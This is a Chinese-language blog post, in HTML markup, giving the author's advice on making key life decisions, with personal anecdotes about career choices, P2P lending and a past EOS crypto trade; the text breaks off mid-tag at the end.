    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先分享个网友的犀利观点，18岁的年轻人对社会一无所知，却要做出影响人生的重大决策，选择大学和专业。其实我们人生的很多关键决策，都是在一无所知和随心所欲的情况下做出的。这很现实，也很无奈，我们没办法改变过去，唯一能做的就是，让自己未来的决策，变得更理性，更有价值一些。</span><br></pre></td></tr></table></figure>
<h2 id="决策的形成"><a href="#决策的形成" class="headerlink" title="决策的形成"></a>决策的形成</h2><a id="more"></a>
<h3 id="信息的获取和筛选"><a href="#信息的获取和筛选" class="headerlink" title="信息的获取和筛选"></a>信息的获取和筛选</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有效决策的基础，是掌握充分的信息。</span><br><span class="line"></span><br><span class="line">比如，你选择大学和专业，你应该对学校的就业情况，学术排名，校园环境，教师水平，以及学科的发展有尽可能多的认识。并且了解一些学长们的发展路线，以及校友的能量和社会分布。</span><br><span class="line"></span><br><span class="line">比如，你选择一份工作，尽可能做背景调查，了解企业的发展趋势，口碑，老板的信用和能力，你直接上司的背景和人品，等等等等。</span><br><span class="line"></span><br><span class="line">比如，你选择一份房产，城市的长远规划，人口的增长趋势，当地产业环境，都应该有足够的认识。</span><br><span class="line"></span><br><span class="line">再比如，你选择开个小店，当地客流，人群分布，竞争对手情况，行业的成本和相关风险，要尽可能了解清楚，自己要会算账，而不是轻信一些中介的宣传。</span><br><span class="line"></span><br><span class="line">在获取信息的过程中，也要有筛选能力，什么是官方信息，你要核实，什么是虚假信息，你要甄别。我看到真的有读者陷入杀猪盘，负债累累。其实挺可怜的，但复盘一下，甄别信息的能力真的是最大的问题。</span><br><span class="line"></span><br><span class="line">信息的获取和筛选，首先是搜索能力。</span><br><span class="line"></span><br><span class="line">搜索能力往往是被低估的一项基本素质，很多人很拽，说不能用百度，要用谷歌，其实百度也好，谷歌也好，擅长搜索的人，各取所需，不擅长搜索的人，用什么都不灵。</span><br><span class="line"></span><br><span class="line">第一，你要知道关键词的不同组合，来追寻你认为有意义的信息。有些时候要多尝试，试一两个词找不到就放弃是很常见的行为。而且现在随着推荐系统越来越强大，很多人懒得去搜索，只靠平台投喂。</span><br><span class="line">有价值的信息，要靠主动搜索，不要靠投喂！</span><br><span class="line"></span><br><span class="line">第二，你要对不同关键词有好奇心，搜索引擎往往有各种提示词，有热榜。</span><br><span class="line"></span><br><span class="line">第三，你至少要知道什么是自然结果，什么是推广结果，以及什么是官方网站，什么是山寨网站。确实有些山寨网站迷惑性很高，但你至少应该知道一些比对方式，特别是政府网站或教育系统网站的域名后缀。</span><br><span class="line"></span><br><span class="line">第四，适度存疑，不要轻信别人的建议和推荐，要做适当的求证，多方信息的比对。</span><br><span class="line"></span><br><span class="line">那么这里重复强调一下，你做出关键决策的时候，务必要自己主动搜索关键信息，不要指望别人把所有你需要的信息都投喂给你，如果你做出决策的依据全部是别人投喂给你的信息，我必须说，这个决策往往非常危险，如果是直系亲属，风险来自于他们的认知能力，如果不是，那么风险简直就太大了。</span><br><span class="line"></span><br><span class="line">别人投喂给你的信息未必都是错的，都是坏的，比如某些自媒体的信息，我总不能说我的信息都是坏的，但如果你要基于我的信息做出决策，我建议你还是自己去主动搜索核对一下，而不是单凭我一面之词。坦白说，我不会为你的决策后果负责，你要自己为自己的决策负责。</span><br></pre></td></tr></table></figure>
<h3 id="底层逻辑能力"><a href="#底层逻辑能力" class="headerlink" title="底层逻辑能力"></a>底层逻辑能力</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">俞军老师在2000年，新浪论坛上的帖子，和人论战，无限看好google，对微软，雅虎的搜索计划不以为然，是基于对搜索引擎的底层逻辑判断，他很清楚，雅虎和微软，都没有真正理解搜索引擎的价值和目标，仅仅当作是门户计划锦上添花的组成部分，而搜索引擎，作为人类知识获取能力的提升方式，是足以颠覆当时的互联网生态的存在。</span><br><span class="line"></span><br><span class="line">这是俞军老师当年职场规划的决策基础。</span><br><span class="line"></span><br><span class="line">我1998年大学毕业，虽然择业上不是很顺利，但是我认为互联网是改变人类的一场革命，并坚持以此为职业目标，就这一点而言，当时的判断是极为准确的。今天看上去这个判断似乎顺理成章，但是在上个世纪末，网民只有几百万的时候，这样的认知其实挺颠覆的。</span><br><span class="line"></span><br><span class="line">2010年左右，安卓刚刚问世，我们在厦门就做出安卓智能手机将横扫市场的判断，当时很多互联网巨头还认为智能手机不是刚需，功能机将长期存在，而且认为塞班的优势不可动摇。</span><br><span class="line"></span><br><span class="line">底层逻辑的基础是什么？</span><br><span class="line"></span><br><span class="line">看技术，产品的底层价值，而不是仅仅看当前的市场表现。</span><br><span class="line"></span><br><span class="line">即时通讯改变了人类的社交方式，造就了腾讯这样的巨头。</span><br><span class="line">搜索引擎改变了人类的知识获取能力，造就了谷歌和百度。</span><br><span class="line">电子商务改变了人类的购物方式，造就了阿里，京东，拼多多等等。</span><br><span class="line">移动互联网的普及，不使用智能手机的用户会变成孤岛，其习惯将无法维系，这是2010年的底层逻辑。</span><br><span class="line"></span><br><span class="line">但是在很多年前，很多人看不清，坦白说，我自己都看不清，至少2000年左右，我完全没看清腾讯和阿里的价值，否则我干嘛不去投效呢，那时候入职门槛又不高对不对。</span><br><span class="line"></span><br><span class="line">底层逻辑还包括一些基本的判断准则</span><br><span class="line"></span><br><span class="line">比如，我们不是天选之子，天上不会掉馅饼。</span><br><span class="line">比如，尊重科学，没有永动机，没有水变油。</span><br><span class="line">尊重科学还要多说一下，如果有革命性的科学成果，首先应该出现在最专业的科学期刊和杂志上，划时代的成果应该是重磅新闻，而不是只出现在某些地方媒体的广告频道里。</span><br><span class="line"></span><br><span class="line">比如说，有人告诉你他们的AI技术超越了阿尔法狗，那你要知道，阿尔法狗可是刷了两次nature封面的技术成果，超越阿法狗，这种成就是值一个图灵奖的，如果连一篇sci都没有，那真的是半个字都不能信的。</span><br><span class="line"></span><br><span class="line">比如，有人告诉你他发现了某些现代医学尚未解决的绝症的治愈手段，这是诺奖级的成果，没理由不刷爆主流媒体。而不需要用什么民族国粹之类的借口掩饰自己。</span><br><span class="line"></span><br><span class="line">比如，有人告诉你，他用量子力学做成了什么牛逼的芯片产品，通常这也是国家级科技金奖的成就，新华社、人民网什么的总应该出来说两句的。如果是军用产品，那逻辑上你就不该在官方媒体通报前知道。按照这个逻辑去理解，这些骗术很容易被甄别。</span><br><span class="line"></span><br><span class="line">但如果你还相信那些深山里藏着绝世武功，一出山就惊天地泣鬼神，这就没辙了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">底层逻辑通透，辅之信息甄别，筛选的能力，你对世界的认知就会上升一个台阶，虽然不能说你一定可以做出正确的决策，但一定能让你避免很多离谱的决策。</span><br><span class="line"></span><br><span class="line">俞军老师为什么一直灌输产品经理要看经济学基础，其实就是提升底层逻辑能力。经济学理论中，博弈理论又是非常核心的，那么我们在做很多决策的时候，很多都是在进行博弈决策。</span><br><span class="line"></span><br><span class="line">坦白说，现在即便很多高学历，高知识背景的人，往往也存在逻辑混乱，认知糊涂的情况。我必须强调一点，极端认知是逻辑的最大敌人，而舆论环境又特别喜欢煽动极端情绪。比如劳资关系，如果你百分百站在劳工权益这边，你觉得自己在维护劳工权益，但最终其实适得其反，资本是全球流动的，最终工作机会会被转移，劳工权益其实是受到损害的。但很多人真的看不到这一点。</span><br><span class="line"></span><br><span class="line">看看博弈理论的书籍，学一些经济学的基础知识，试图理解所有革新产品的核心价值，可以把这些作为关键决策的基础。</span><br></pre></td></tr></table></figure>
<h3 id="通识人性"><a href="#通识人性" class="headerlink" title="通识人性"></a>通识人性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其实卡耐基的那套鸡汤丛书《人性的优点》，《人性的弱点》，很多是讲人性的，有时候回顾一下，还是有意义的。</span><br><span class="line"></span><br><span class="line">有些讲谈判的书籍也是。谈判的目标是什么，是获得别人对你的支持和认可，而不是强调谁对谁错。我们职场，创业，很多时候都需要谈判。如果你现在创业，面对投资人，你认为你的方案无懈可击，而投资人却觉得这个领域没有机会，你非要纠正投资人的认知，这恐怕是没戏的，但有些创业者可以跨越认知差异，让投资人看到自己闪光的一面，让投资人觉得人才难得，从而改变主意进行投资，为什么能做到？</span><br><span class="line"></span><br><span class="line">人性是什么，趋利避害是人性，自我保护是人性，自我高估也是人性。贪婪是人性，为自己的贪婪找借口也是人性。</span><br><span class="line"></span><br><span class="line">很多时候，你觉得自己是对的，你做出了正确的判断和决策，但为什么别人不相信你，为什么别人不支持你，因为你没有站在别人角度思考，没有体会别人的心态。</span><br><span class="line"></span><br><span class="line">我们试图理解一些逻辑是否成立，试图理解一些计划是否可行的时候，往往需要通识人性，比如说，你应该理解，信任是有成本的，是需要逐步建立的，无论是初入职场，还是服务你的用户，你应该循序渐进让别人信任你，给你机会，而不是试图一步到位改变别人对你的认识。</span><br><span class="line"></span><br><span class="line">有些创业者，拿出一套创业方案，仔细一看，产品设想完全是异想天开，为什么，因为没有迎合人性，这时候，拉你参与创业，你需要决策了，这就是考验你判断力的时候了，你如果通识人性，很容易看到这样的问题，并且及早避开这样的项目。</span><br><span class="line"></span><br><span class="line">职场内也是，你希望得到晋升，你希望获得认可，你不但要有业绩，也要通识人性，让你的同事支持你，让其他部门支持你，而不是光强调自己多优秀，很多人不知不觉得罪了同事，自己浑然不知，一些关键晋升的机会就被一些七七八八的负面评价阻碍了，还觉得都是别人的错。我之前讲过，感恩不只是美德，为什么这么说，因为感恩往往能够更好的获得别人的信任，从而在某个关键时刻获得支持，这么说其实挺功利的，好像感恩都是有目的的，其实你养成这个习惯，真的是受益无穷。</span><br><span class="line"></span><br><span class="line">我坦白说，我见过不少创业者，有些人在我心目中有坏印象，但我也不好意思公开说。那我随便举几个例子，只有需要我帮助的时候才联系我，平时从来不打招呼的，帮过忙也没什么表示的，这是一种。未经我许可把我的聊天记录发出去的，这是一种。自来熟特别不见外的，这是一种。餐桌上当着陌生妹子荤段子不停的，这是一种。当然，不同的人可能有不同的好恶，但是很多人，都是不知不觉在别人心目中留下差评，而自己浑然不觉。</span><br><span class="line"></span><br><span class="line">我其实也不例外，我相信，我也没少在别人心目中留下差评。以前说少不更事，现在其实可能也没好到哪里去。</span><br><span class="line"></span><br><span class="line">我最近还在跟空降的人才聊天提到，虽然确实有很多施展才华的空间，但不要一上来想着做出各种改变，先要吸收，看看数据，和团队多做沟通，理解不同层级，不同岗位的人的诉求、目标和他们的担忧，梳理清楚，然后看看怎样求同存异，做出合适的计划，循序渐进，建立信任基础，再逐步推进自己的目标。一上来就谈很多计划，第一，都没有认真聆听别人的想法和顾虑，很多计划可能本身就有问题。第二，没有信任基础，很多事情很难得到团队支持。</span><br><span class="line"></span><br><span class="line">这是有过程的。</span><br><span class="line"></span><br><span class="line">通识人性，也可以让你更好的判断别人给你信息，对你支持的真伪，动机和目标。通常，你的决策可能来自于其他人的建议，其他人的鼓动，或者参考其他人的经历。那么，你要能理解这个其他人，到底有几分可信。</span><br><span class="line"></span><br><span class="line">一个常见的问题是，那些真正好心的人，往往不擅长话术和套路，提出的意见和建议往往令人心生憎恶。而那些擅长收割的人，却总能显露出一切都是为了你好的诚意来。所有成功的骗子，都通识人性，只有通识人性，才能完成收割。所以，如果你能通识人性，也可以少踩很多这样的坑。</span><br><span class="line"></span><br><span class="line">看看心理学的专著。比如《这才是心理学》。</span><br><span class="line"></span><br><span class="line">感觉还是有点单薄，说说人性的一些案例吧。</span><br><span class="line"></span><br><span class="line">某些骗子会说，有个政府主持的慈善事业，需要你的资金，但会提供非常高的回报，而且如果你带动更多人进来，还会有下线佣金。这样的骗局前几年非常多。</span><br><span class="line"></span><br><span class="line">首先，强调政府主持，获取信任。用回报满足人们的贪婪心理，然后用慈善给这些人的贪婪一个借口，贪婪是需要借口的，这就是人性的典型特征。你让这些人捐款给慈善事业，他们是不肯的，你说有高回报的慈善基金，他们满足了贪婪的底层欲望，又自我感觉非常有爱心。</span><br><span class="line"></span><br><span class="line">自我保护也是一种人性，如果你当众批评某个人，哪怕你是对的，别人第一感也是反驳你，或者强调自己的正确。但如果你私下、用相对委婉的方式提出对方的某个问题，很多人还是愿意接受的，甚至感谢你。当然，我们说坦诚是沟通成本最低的方式，但这也因人而异，因事而异。阿里前几年的那种破冰文化，坦白说我是无法接受的。</span><br><span class="line"></span><br><span class="line">自我高估更是人性了，我们做个思想实验，假如一个项目顺利完成，让每个成员都写出自己在项目中的贡献比重，然后汇总算算看，我相信一定是大幅度超过100%的。有兴趣的项目负责人可以试试看，友情提醒，如果公开讨论，出现撕逼状况，我概不负责。</span><br><span class="line"></span><br><span class="line">人性还有选择性记忆和选择性遗忘，很多人会选择性记忆自己历史上的高光时刻和准确预见，选择性遗忘一些愚蠢的判断和预测，所以他们总觉得自己的才华被埋没。</span><br><span class="line"></span><br><span class="line">通识人性，不但可以增强你的判断能力，还能增强你把握机会的能力。很多时候，你生命中的贵人就在不经意间出现在你的身边，如果你能通识人性，把握这种机会可能就会相对容易。</span><br><span class="line"></span><br><span class="line">比如关键面试，比如面对投资人，比如重要的商务合作谈判，比如面对关键客户，比如职场晋升的考核答辩，比如与自己心仪异性的一个重要的约会，等等。</span><br><span class="line"></span><br><span class="line">怎样才能被人信任，怎样才能被人喜欢，怎样才能让人信服。首先你要能尽可能的理解对方。</span><br><span class="line"></span><br><span class="line">营销高手刀姐曾经写过她怎么钓到她老公的，首先她一直观察男神的朋友圈，了解对方的喜好，然后设置了一个专门分组，投其所好的发布一些专门给男神看的动态信息，很快对方就主动找她聊天，建立了共同话题。课程设计到这里的时候，我有点觉得不好把握，从某种意义来说，理解人性，可以更好的让我们避坑，但也可以用来收割其他人。屠龙技在手，你要做英雄，还是恶龙，只能你自己斟酌。确实，很多诈骗犯，杀猪盘都是通透人性的大师。</span><br><span class="line"></span><br><span class="line">很多资金盘游戏是怎么逐步建立用户信任的，为什么他们能做到i，你就做不到了。</span><br><span class="line"></span><br><span class="line">提问：同问怎么训练底层逻辑</span><br><span class="line">回答：经济学的书籍和博弈论有关的书籍，认真研读。</span><br><span class="line"></span><br><span class="line">提问：因为不清楚对方的预期是什么</span><br><span class="line">回答：因为很多人压根不试图去了解对方预期。</span><br></pre></td></tr></table></figure>
<h3 id="自我认知"><a href="#自我认知" class="headerlink" title="自我认知"></a>自我认知</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通识人性，有助于我们更好的了解他人，更好的与他人合作，或者更好的理解商业模式。</span><br><span class="line"></span><br><span class="line">但很多时候，我们分析别人容易，分析自己难。所谓当局者迷，旁观者清。所以，前面提到的一些人性特征，不但要用来理解别人，更要用来剖析自己，坦白说，剖析自己是个有点痛苦的过程，我们会不得不面对自己的猥琐，怯懦，贪婪，乃至放荡。不得不揭下自我保护的那些借口，直面自己的底层认知，原来自己那么多冠冕堂皇的理由，其实不过是掩盖自己的贪婪和私欲。</span><br><span class="line"></span><br><span class="line">很多很多人的生活和职场是拧巴的，因为长辈的劝导，因为身边亲朋好友的期许，活成别人所期望的样子，但内心纠结痛苦，挣扎烦恼。</span><br><span class="line"></span><br><span class="line">所谓跳出舒适区，其实是为了进入更为广阔深远的舒适区。所谓延迟满足，延迟是过程，满足是目标。</span><br><span class="line"></span><br><span class="line">当然，我们不可能完全随心所欲选择自己所期望的生活，我自己也做不到，但这个世界还是给了我们很多选择权的，在很多时候，我们有选择权的时候，我们忘了自己想要什么。</span><br><span class="line"></span><br><span class="line">很多人咨询求职建议的时候，这个好不好，那个好不好，却没问问自己，你适合做什么，你希望获得什么，可能为了达成目标，也存在一个不那么愉快的过程，但你的忍耐底线在哪里，以及你的理想彼岸在何方，这些只有你自己知道，别人真的不知道。</span><br><span class="line"></span><br><span class="line">有很多人说，公务员好不好，看你自己，喜欢不喜欢那种环境，愿意不愿意进入那样的氛围，你喜欢，你觉得那就是你理想的所在，我干嘛要拦着你呢；你不喜欢，你父母逼你去，那我告诉你，你应该有自己的选择。</span><br><span class="line"></span><br><span class="line">一个人成长过程中，可能需要强迫自己做出某些改变，需要让自己更好的适应社会环境，需要增强自己一些不擅长的能力，这确实是有必要的，但这个是过程，是手段，不是目标；而目标，你要明确，是你的目标，不是你家人的目标，不是你父母的目标，你要知道自己的目标是什么。</span><br><span class="line"></span><br><span class="line">运动员，勤奋练习，是为了赢得比赛，挑战自己的极限。</span><br><span class="line">一个产品经理，磨练沟通技巧，是为了达成伟大的产品梦想。</span><br><span class="line">一个技术专家，刷算法题，是为了挑战复杂的技术场景。</span><br><span class="line"></span><br><span class="line">过程可能有些痛苦，有些不愉快，但最终挑战胜利的感觉是很好的。很多人努力奋斗，就是为了挑战一些目标，无论是技术、产品、还是身体机能。我说过，我读书的时候，做数学题是津津有味的，因为挑战成功的感觉很好，就跟玩游戏通关的感觉是一样的。</span><br><span class="line"></span><br><span class="line">你要找到自己人生的挑战目标，基于这个目标，可以忍受一些过程中的不愉快，但最终还是要追求一个愉快的通关体验。当你很清楚自己的长远目标的时候，你对短期困境的忍耐力就会坚韧很多，持续前进的动力才会充足。</span><br><span class="line"></span><br><span class="line">自我认知过程中，高估自己和低估自己都会出现，有的人倾向于高估自己，有的人倾向于低估自己。所以很早我有句话，王兴也说过类似的，现在也是适用的，别太把自己当回事，也别不把自己当回事。你可能不是天之骄子，但也不是一无是处。你需要的是，尽快确认自己的定位。</span><br><span class="line"></span><br><span class="line">一些简单的自我认知的测试。</span><br><span class="line"></span><br><span class="line">你上一次认为自己傻逼是什么时候，捡诛心的事情说，丢手机啦，忘了跟班主任打招呼啊，这种不算。如果你不记得自己上一次傻逼的时候，那么傻逼第一定律，“从来不认为自己傻逼的人，往往是不可救药的大傻逼”，就符合你了。</span><br><span class="line"></span><br><span class="line">你觉得自己的天赋是什么，以及在你的天赋范围内，所取得的最辉煌的成就是什么？如果在你自认为的天赋领域内做不到轻松秒杀98%的同龄人，你的这个天赋可能有点水。</span><br><span class="line"></span><br><span class="line">你最近的接受别人批评是什么时候，以及是否认为自己已经真的接受并改正了，那种“老总，我可要批评您，您太不注意保重身体了。”的批评不算。</span><br><span class="line"></span><br><span class="line">这些测试，可以有助于认清自己是否存在认知障碍，过于高估自己，过于相信自己。</span><br><span class="line"></span><br><span class="line">我其实很多年都没找到自我定位，我一直说自己杂而不精，确实我的职场经历比较奇葩，做过产品，做过研发，创业的时候啥都做，做过数据分析，做过IT售前，还写过自媒体。从领域来说，信息安全，搜索引擎，企业办公系统，电信计费营帐系统，呼叫中心，广告系统，商业分析系统，游戏社区，都有接触。其实很长时间，我都不知道自己适合做什么，也不知道自己职场目标是什么，这是真的。我没有俞军老师如此明确的追求和目标，我只是明确了互联网是个好的方向，但具体的领域，和我具体的能力，我是含糊不清的，而且很长时间，甚至说我在职场黄金期的时候，我还低估了自己所擅长的能力，这也是我职场比较吃亏的地方。</span><br><span class="line"></span><br><span class="line">今天，有些话我敢说了，我的数据感超强，此外我的整体逻辑感很好，遇到一些具体技术问题，我的思维方式可以有助于快速定位问题和寻求解决途径，虽然我的算法能力不强，编程水平也一般，但分析问题和定位问题的能力，远远超过我编程体现出来的技术能力。当然，这也是十年前的表现，现在很惭愧，新的技术方案和技术路线已经看不懂了，更不要提分析问题、定位问题能力了。</span><br><span class="line"></span><br><span class="line">人无完人，每个人都有自己擅长的地方，也有自己不擅长的地方，找到自己的优势，尽可能显露出来，在做关键决策的时候，尽可能选择可以显露自己优势，又能符合自己长远目标的路线。</span><br><span class="line"></span><br><span class="line">前段时间和老板们谈人才话题，我就反驳了一些老板的观点，是不是公司所有问题都是人才不足的问题，我不这么认为，人才不足的问题往往是管理问题，以前4399招聘了很多低薪低门槛低背景的员工，这其中就有一些人，体现出了超强的成长性，成为业内的顶尖人才。我私下可以说出好几个名字，就不公开说了。</span><br><span class="line"></span><br><span class="line">坦白说，他们其实短板也挺多的，低薪低门槛低背景的人，想想就知道，一开始看上去都很平庸，但如果能用其所长，给予一定的空间，发挥他们优势能力，还是有不少人可以快速成长，快速突破自己。（当然，能做到的也只是很少一部分，不可能每个人都成为顶尖人才）。</span><br><span class="line"></span><br><span class="line">为什么说这个话题，回到今天的话题，我们有些背景不强的年轻人，其实也是有机会成长为顶尖人才的，但第一你要自己知道自己的优势在哪里，要想办法显露出来；第二，确实也要寻找给你空间，给你机会的舞台，也要有合适的管理者能带你成长，给你一些辅导和支持，有些时候可能确实有运气的成分，但不要轻易的放弃自己的成长可能性。不要过于低估自己的潜力。在很多领域，成为行业高端人才，未必需要强大的天赋。</span><br><span class="line"></span><br><span class="line">所以自我认知定位是关键决策很重要的部分，我知道这里读者有很多疑惑，怎样才能找到自己的定位，我也没有天眼，能一眼看出每个人的天赋和优势，你们需要自己不断地问自己这个问题，不断地通过其他人的反馈了解自己，不断地反思和复盘，这是个长期的事情，没有一步到位的手段。</span><br><span class="line"></span><br><span class="line">关于自我认知，还有很重要的一点要说，就是量力而行。一定要量力而行，比如创业，你有什么资源，有什么强处，有什么不足，有谁愿意做你的合伙人，要做自己能掌控的事情，你说我还缺个投资人，缺个工程师，缺个什么什么，这事多半不行。</span><br><span class="line"></span><br><span class="line">比如你答应别人做什么事情，能不能做到，能不能有把握，别为了面子什么都答应，做不到的就说做不到的，可以试试的说自己尽力去试，不要轻易承诺，一个靠谱的人是承诺的事情能做到，不是什么都能承诺。</span><br><span class="line"></span><br><span class="line">人们往往会因为面子，因为想要在某些人面前做出表现，而做出超出自己能力的承诺，这是很多很多灾难决策产生的原因。我希望我的读者尽力避免这一点。</span><br></pre></td></tr></table></figure>
<h3 id="机会成本以及风险评估"><a href="#机会成本以及风险评估" class="headerlink" title="机会成本以及风险评估"></a>机会成本以及风险评估</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先回顾一下，做关键决策的时候，我们要掌握充分的信息，并具有一定的筛选手段；要有底层逻辑能力，才能把信息价值最大化；要通晓人性，才能获得足够的社交支持，以及更好的理解产品及商业行为。要有足够的自我认知，能扬长避短发挥自己的价值，并确定和追寻自己的长远目标。</span><br><span class="line"></span><br><span class="line">这些够了么，还不够，还差一点，就是要有成本及风险评估的意识。</span><br><span class="line"></span><br><span class="line">回到开始，当我们做关键决策的时候，必须意识到，很多事情是不能兼得的，你不能既要，又要。这时候，你要有一定的评估，比如你放弃了一个优渥薪酬的职位，去加入一个有前景的创业公司，你要知道你的机会成本是多少。</span><br><span class="line"></span><br><span class="line">虽然很多成功案例告诉我们，为了追求梦想，可以不惜一切代价，但我们所能看到的，往往是幸存者偏差。</span><br><span class="line"></span><br><span class="line">什么是机会成本，当你面临A、B两个选择的时候，你选择B的预期收益，就是你选择A的机会成本。</span><br><span class="line"></span><br><span class="line">自己能承担的风险底线是多少，为了追求某种回报，自己付出的机会成本是多少，这个帐算清楚。</span><br><span class="line"></span><br><span class="line">那么另一个就是我重复无数遍的，真的决定去尝试风险性的决策，务必牢记止损原则。此外，我旧文提过多次的，警惕那些让你ALL In的人。</span><br><span class="line"></span><br><span class="line">风险评估。</span><br><span class="line"></span><br><span class="line">政策及法规风险肯定是第一位的，很多创业者死于政策及法规风险，项目死掉的，算还好的，人进去的，也不少。</span><br><span class="line"></span><br><span class="line">那么项目可行性风险，如何规避一厢情愿，异想天开，需要通识人性，需要自我认知，也需要对信息的充分获取筛选和底层逻辑判断。</span><br><span class="line"></span><br><span class="line">信用风险，第一，你是否会因为某个决策失去信用，这个要理解信用成本，往往比你以为的要高。第二，你的预期回报是否存在信用风险，合伙人或老板的信用口碑如何。第三，一些关键资源，关键合作伙伴是否存在信用风险，也是要评估的，比如你特别依赖某个供应商，或者特别依赖某个技术专家，但这个依赖方是否可能违约，也是要考虑的。</span><br><span class="line"></span><br><span class="line">市场环境风险，特别涉及投资领域，这个特别特别重要。我最近也在某个投资项目上亏了一些钱，也是遇到了市场环境的急剧恶化，不过还好，投资本身就是有风险预期的，反正亏的也不多，看在我还在努力赚钱的份上，老婆都没骂我。</span><br><span class="line"></span><br><span class="line">大体如此，无论是选择就业，选择投资，还是选择一份职场工作，都会存在一定的风险。但是不是绝对风险规避，我觉得没必要，一定程度上，我们追求某些高回报，总要担当一些风险。以前说解放战争的杰出将领，60%的胜利可能性，就坚决开战了，不可能追求百分百的确定性。</span><br><span class="line"></span><br><span class="line">我们的人生不止一次选择，我们的选择也不止一个结果，当我们发现存在一定的机会，具有一定的几率，只要这个几率大于某个预期值，是可以大胆去博的，谨小慎微有助于避坑，却无助于你的身价和资产增值。</span><br><span class="line"></span><br><span class="line">评估风险，不代表害怕风险，或者一昧的躲避风险，正确的认识风险，但依然要有坚决果断的决心。</span><br><span class="line"></span><br><span class="line">我最近几年胆子确实比较小，其实我早些年投资还是比较激进的，教训很多，失误很多，但现在毕竟也不算穷对不对。只要不ALL In，手里一直有筹码，凡事总有周旋的余地。</span><br><span class="line"></span><br><span class="line">那么关于p2p理财，特别是懒投资，有不少读者指责我当年替他站过台，这个我觉得还是可以复盘一下当年的投资决策。</span><br><span class="line"></span><br><span class="line">第一，当年真的没有接过任何p2p理财广告，真的没有拿过一分钱佣金，我提及这个产品是真的我在学习互联网金融，并且作为案例来分享，但没有作为投资建议来讲。你们随便翻旧文，真的没有作为投资建议说过。</span><br><span class="line"></span><br><span class="line">坦白说，我虽然怼了很多p2p平台，但确实没想到p2p金融整个行业会团灭。如果你说这个现状打我脸了，我认，但你要说我为了自身利益介绍有问题的平台给读者，我真不认。</span><br><span class="line"></span><br><span class="line">第二，早期其实我家里也买了懒投资理财，真的买了，但我很保守，在现金流中严格控制了比例。</span><br><span class="line"></span><br><span class="line">第三，2017年中一些平台开始暴雷，我立即决定赎回撤出，事实上我没有任何损失，那么这里问题来了，为什么没有通知我的读者，我根本不知道懒投资的运营状况，我一直在东南亚居住，根本不在国内，我只是觉得行业形势严峻，自己保守而已，我怎么能没有任何证据就随便说懒投资有问题呢，再说，我也没推销过人家理财，我为啥突然无缘无故要出来砸人家场子呢。</span><br><span class="line"></span><br><span class="line">第四，我最早提及懒投资的时候，讲的是保理模式，上市公司的采购合同担保，资金相对安全。但如果你们细心跟踪懒投资的发展，到后面其实他们很多借贷已经不是保理模式了，涉及一定程度的风险投资了；而且乐视和暴风出事后，就算是上市公司的采购合同也不安全了，这是很明面的事情。</span><br><span class="line"></span><br><span class="line">我真不是给自己找借口，2015年全互联网鼓吹p2p金融的时候，我已经说过行业风险，但确实无法预判整个行业的崩溃，但2017年中，我自己是不敢冒这个风险，今天讲这个案例，我觉得这就是投资决策的风险评估和机会成本。你能多赚多少钱呢，而行业风险是多大呢，懒投资好歹在行业内相对好一些，至少行业风险展现的时候，是可以有机会撤出的。</span><br><span class="line"></span><br><span class="line">投资决策，特别是大金额投资决策，就是一个关键决策，我们今天回顾这个案例，也是因为这是很有代表性的案例，你做出这样的关键决策，对行业信息是否保持足够的敏锐呢，那些暴雷信息和各种风险提示是否一直有关注呢；你是否具有底层逻辑，能够理解超高利率p2p理财的不可持续性呢；你是否具有风险评估能力，在行业风险相对清晰的时候，快速决断呢。</span><br><span class="line"></span><br><span class="line">为什么很多人无法做到快速决断呢，很多人习惯惯性思维，简单认为未来是过去的延续，对市场变化和风险视而不见。还有就是盲从权威，跟随某个所谓的领域大牛，专家学者决策。我不说别人，我在金融领域几次非常惨重的投资失误，都是因为盲从权威造成的。我随便说一个，2008年金融危机的时候，看国内金融专家直播，说房利美、房地美不可能倒，全美国的房贷都是他们放的，美国政府一定会救的。信以为真，我懂这个市场么，我以为能抄底，结果，18层地狱有没有，到今天都恢复不过来有没有。你们看看房利美，房地美在金融危机前后的股价和市值变化，就知道我说的是什么了。盲从权威，进入自己不懂的领域，放纵贪婪，最后自食恶果。</span><br><span class="line"></span><br><span class="line">而很多在p2p损失惨重的人，连盲从权威都不是，根本就是信了一些所谓自媒体大V的广告，就重仓了，典型的如占豪这样的爱国大V，当年接各种p2p广告佣金拿到手软有没有，不知道坑死多少人。你自己的底层逻辑在哪里，自己的风险认知在哪里。</span><br><span class="line"></span><br><span class="line">今天要分享的大体如此。</span><br><span class="line"></span><br><span class="line">关键决策的构成，第一，足够充分的信息和数据，以及筛选能力；第二，底层逻辑能力，从而更好的理解信息的价值。第三，通识人性，第四，自我认知，第五，机会成本和风险评估。</span><br><span class="line"></span><br><span class="line">真的真的不要试图在自己不擅长的领域下重注，做风险投资。真的不要怕失去机会，这世界上有太多的机会明白么，只去抓取自己能把握的，就足够好了！</span><br><span class="line"></span><br><span class="line">我还可以承认一件事，我以前也炒过币，我一直没说，我当年炒币还赚了二十多万人民币好像。就买了点EOS，30多人民币买的，100多人民币卖的，不到两个月时间赚了2倍。以前不分享是因为我不觉得这事有啥可分享的，而且我也不认为这种决策可以复制。</span><br><span class="line"></span><br><span class="line">那么今天复盘一下决策逻辑</span><br><span class="line"></span><br><span class="line">第一，下注的可控性，确实这是一种赌博，但我当时投入的资金是十多万，对我而言，输光了，最多被老婆说几句，对生活没啥大影响。这是我的底气所在。我绝不可能用影响生活水平的现金去做这样的风险决策。</span><br><span class="line"></span><br><span class="line">第二，信息面，我当时恰好知道一些信息，温州一些老板重资在抢所谓的投票权，也就是产币权，我分析了一下这个底层逻辑，骨子里不就是竞价排名么，这个我熟啊。抢筹游戏，一定会带来一波疯涨。</span><br><span class="line"></span><br><span class="line">第三，我的人性认知告诉我，币值踩踏一定会在公网上线前发生。那些抢筹者只图获利，所谓信仰都是借口。</span><br><span class="line"></span><br><span class="line">第四，基于自我认知，币圈久赌必输，不会次次好运，所以此后再也不碰。</span><br><span class="line"></span><br><span class="line">结果，完全符合预期，EOS从飙升到踩踏，直到现在都没恢复到当时的高点。</span><br><span class="line"></span><br><span 